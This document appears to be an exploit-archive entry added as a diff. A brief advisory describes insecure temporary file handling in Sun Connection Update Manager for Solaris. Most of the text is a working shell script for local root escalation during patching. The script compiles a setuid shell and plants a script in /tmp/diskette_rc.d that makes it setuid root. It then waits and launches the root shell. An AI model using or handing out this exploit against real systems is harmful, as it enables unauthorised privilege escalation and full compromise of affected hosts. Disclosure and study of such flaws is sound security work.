@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/38928/info
+
+Sun Connection Update Manager for Solaris creates temporary files in an insecure manner.
+
+An attacker with local access could potentially exploit these issues to perform symbolic-link attacks, overwriting arbitrary files in the context of the affected application.
+
+Successfully mounting a symlink attack may allow the attacker to overwrite or corrupt sensitive files, which may result in a denial-of-service or privilege escalation. Other attacks may also be possible.
+
+These issues affect unknown versions of the application. In addition, these issues may affect certain Solaris patch clusters or individual patch releases.
+
+#!/bin/sh
+#Larry W. Cashdollar, local root for Solaris x86 during patching
+#10/4/2013 Tested on Cluster 9/30/2013
+# larry@s0l4r1s:~$ ./disk_exp.sh 
+# [+] Creating evil shell
+# [+] Hope you've got gcc on here, compiling...
+# [+] Waiting for root shell
+# [+] Tada!
+# # id
+# uid=0(root) gid=0(root)
+
+
+echo "[+] Creating evil shell"
+
+cat << EOF > r00t.c
+#include <stdio.h>
+#include <unistd.h>
+int
+main (void)
+{
+  char *shell[2];
+  shell[0] = "sh";
+  shell[1] = NULL;
+  setreuid (0, 0);
+  setregid (0, 0);
+  execve ("/bin/sh", shell, NULL);
+  return(0);
+}
+EOF
+
+echo "[+] Hope you've got gcc on here, compiling..."
+
+gcc r00t.c -o /tmp/r00t
+
+mkdir -p /tmp/diskette_rc.d/
+
+echo "#!/bin/sh" > /tmp/diskette_rc.d/rcs9.sh
+echo "chown root:root /tmp/r00t" >> /tmp/diskette_rc.d/rcs9.sh
+echo "chmod +s /tmp/r00t" >> /tmp/diskette_rc.d/rcs9.sh
+chmod +x /tmp/diskette_rc.d/rcs9.sh
+echo "[+] Waiting for root shell"
+
+until [  -u /tmp/r00t ]; do sleep 1; done; echo "[+] Tada!";/tmp/r00t
